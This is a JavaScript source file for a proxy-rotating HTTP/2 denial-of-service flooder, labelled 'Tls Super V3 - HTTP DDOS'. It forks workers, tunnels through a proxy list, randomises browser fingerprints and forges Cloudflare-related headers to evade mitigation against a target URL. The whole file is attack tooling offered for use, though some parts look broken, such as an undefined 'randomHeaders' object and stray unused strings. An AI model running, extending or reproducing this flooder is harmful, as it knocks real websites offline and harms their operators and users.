const a = require("net");
const b = require("http2");
const c = require("tls");
const d = require("cluster");
const e = require("url");
const f = require("user-agents");
const g = require("fs");
const {
  HeaderGenerator: h
} = require("header-generator");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", function (a) {});
if (process.argv.length < 7) {
  console.log("node tlsv3 url time rate thread proxyfile");
  process.exit();
}
const i = {};
function j(a) {
  return g.readFileSync(a, "utf-8").toString().split(/\r?\n/);
}
function k(a, b) {
  return Math.floor(Math.random() * (b - a) + a);
}
function l(a) {
  return a[k(0, a.length)];
}
const m = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
};
dest_header = ["audio", "audioworklet", "document", "embed", "empty", "font", "frame", "iframe", "image", "manifest", "object", "paintworklet", "report", "script", "serviceworker", "sharedworker", "style", "track", "video", "worker", "xslt"];
cache_header = ["max-age=0", "no-cache", "no-store", "pre-check=0", "post-check=0", "must-revalidate", "proxy-revalidate", "s-maxage=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "no-cache, no-store,private, max-age=604800, must-revalidate", "max-stale", "max-age=315360000", "stale-if-error", "max-age=31557600", "max-age=2592000", "s-maxage", "min-fresh", "max-age=31536000,public", "max-age=31536000,public,immutable", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "no-transform", "only-if-cached", "public", "private"];
mode_header = ["cors", "navigate", "no-cors", "same-origin", "websocket"];
site_header = ["cross-site", "same-origin", "same-site", "none"];
var n = j(m.proxyFile);
const o = e.parse(m.target);
if (d.isMaster) {
  for (let a = 1; a <= m.threads; a++) {
    console.clear();
    console.log("Tls Super V3 - HTTP DDOS 82 %".rainbow);
    console.log(" Admin : Anon Grem X HaiBe".gray);
    console.log(" Target: ".brightYellow + process.argv[2].blue);
    console.log(" Theard: ".brightYellow + process.argv[5].blue);
    console.log(" Proxy : ".brightYellow + process.argv[6].blue);
    console.log(" Time  : ".brightYellow + process.argv[3].blue);
    console.log(" Rate  : ".brightYellow + process.argv[4].blue);
    console.log("---------------------------------------------".gray);
    console.log("Staus :".blue + "Send Attack SuccessFul TarGet".rainbow);
    d.fork();
  }
} else {
  setInterval(s);
}
class p {
  constructor() {}
  HTTP(b, c) {
    const d = b.address.split(":");
    const e = "CONNECT " + b.address + ":443 HTTP/1.1\r\nHost: " + b.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const f = new Buffer.from(e);
    const g = a.connect({
      host: b.host,
      port: b.port
    });
    g.setTimeout(b.timeout * 10000);
    g.setKeepAlive(true, 10000);
    g.on("connect", () => {
      g.write(f);
    });
    g.on("data", a => {
      const b = a.toString("utf-8");
      const d = b.includes("HTTP/1.1 200");
      if (d === false) {
        g.destroy();
        return c(undefined, "error: invalid response from proxy server");
      }
      return c(g, undefined);
    });
    g.on("timeout", () => {
      g.destroy();
      return c(undefined, "error: timeout exceeded");
    });
    g.on("error", a => {
      g.destroy();
      return c(undefined, "error: " + a);
    });
  }
}
function q() {
  const a = ["Windows", "Windows NT 10.0", "Windows NT 6.1", "Windows NT 6.3", "Macintosh", "Android", "Linux", "Macintosh", "X11", "Windows NT 6.1", "Windows NT 5.1", "Macintosh, Intel Mac OS X 10_14_6", "Macintos", "Intel Mac OS X 10_15_7"];
  const b = ["Chrome", "Firefox", "Safari", "Edge", "Opera"];
  const c = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES", "vi-VN"];
  const d = ["US", "GB", "FR", "DE", "ES", "VN", "ES", "CN", "PT", "VN", "RU", "TW", "TL", "BW", "BM", "AF", "DZ", "AD", "AG", "AM", "AR"];
  const e = ["Windows", "Apple", "Google", "Microsoft", "Mozilla", "Opera Software", "Chrome", "Firefox", "Safari", "Edge", "Opera"];
  const f = a[Math.floor(Math.random() * a.length)];
  const g = b[Math.floor(Math.random() * b.length)];
  const h = c[Math.floor(Math.random() * c.length)];
  const i = d[Math.floor(Math.random() * d.length)];
  const j = e[Math.floor(Math.random() * e.length)];
  const k = Math.floor(Math.random() * 100) + 1;
  const l = Math.floor(Math.random() * 6) + 1;
  const m = j + "/" + g + " " + k + "." + k + "." + k + " (" + f + "; " + i + "; " + h + ")";
  const n = btoa(m);
  let o = "";
  for (let a = 0; a < n.length; a++) {
    if (a % l === 0) {
      o += n.charAt(a);
    } else {
      o += n.charAt(a).toUpperCase();
    }
  }
  return o;
}
const r = new p();
i[":method"] = "GET";
i.GET = "/HTTP/2";
i["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
i[":path"] = o.path;
i[":scheme"] = "https";
i["cf-mitigated"] = "challenge";
i["content-type"] = "text/html; charset=UTF-8";
"multipart/form-data; boundary=something";
i.Referer = "https://google.com";
"https://facebook.com";
"http://judge1.api.proxyscrape.com/";
"http://judge2.api.proxyscrape.com/";
"http://judge3.api.proxyscrape.com/";
"http://judge4.api.proxyscrape.com/";
"http://judge5.api.proxyscrape.com/";
"https://api64.ipify.org/";
"http://www.office.com";
"https://checkerproxy.net";
"https://www.check-host.net";
"https://github.com";
"https://nminh23.click";
"https://nm2302.site";
i.accept = randomHeaders.accept;
i["accept-language"] = randomHeaders["accept-language"];
i["accept-encoding"] = "gzip, deflate, br";
"*";
"br";
"br;q=1.0, gzip;q=0.8, *;q=0.1";
"gzip, compress";
"gzip, deflate, lzma, sdch";
"deflate";
"gzip";
"compress;q=0.5, gzip;q=1.0";
"gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25";
"gzip;q=1.0, identity; q=0.5, *;q=0";
"*/*";
i.Connection = "keep-alive";
i["upgrade-insecure-requests"] = randomHeaders["upgrade-insecure-requests"];
i.TE = "trailers";
i["cdn-loop"] = "cloudflare";
i["x-requested-with"] = "XMLHttpRequest";
i["origin-agent-cluster"] = "?1";
i["sec-fetch-user"] = "?1";
i["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
i["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
i["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
i.cookie = randomHeaders.cookie;
function s() {
  const a = l(n);
  const d = a.split(":");
  const e = new f();
  i[":authority"] = o.host;
  i["user-agent"] = q();
  const g = {
    host: d[0],
    port: ~~d[1],
    address: o.host + ":443",
    timeout: 100
  };
  r.HTTP(g, (a, d) => {
    if (d) {
      return;
    }
    a.setKeepAlive(true, 60000);
    const e = {
      ALPNProtocols: ["h2"],
      followAllRedirects: true,
      challengeToSolve: 5,
      clientTimeout: 5000,
      clientlareMaxTimeout: 25000,
      echdCurve: "GREASE:X25519:x25519",
      ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
      rejectUnauthorized: false,
      socket: a,
      decodeEmails: false,
      honorCipherOrder: true,
      requestCert: true,
      secure: true,
      port: 443,
      uri: o.host,
      servername: o.host
    };
    const f = c.connect(443, o.host, e);
    f.setKeepAlive(true, 60000);
    const g = b.connect(o.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 100,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => f,
      socket: a
    });
    g.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 100,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false
    });
    g.on("connect", () => {});
    g.on("close", () => {
      g.destroy();
      a.destroy();
      return;
    });
    g.on("error", b => {
      g.destroy();
      a.destroy();
      return;
    });
  });
}
const t = () => process.exit(1);
setTimeout(t, m.time * 1000);
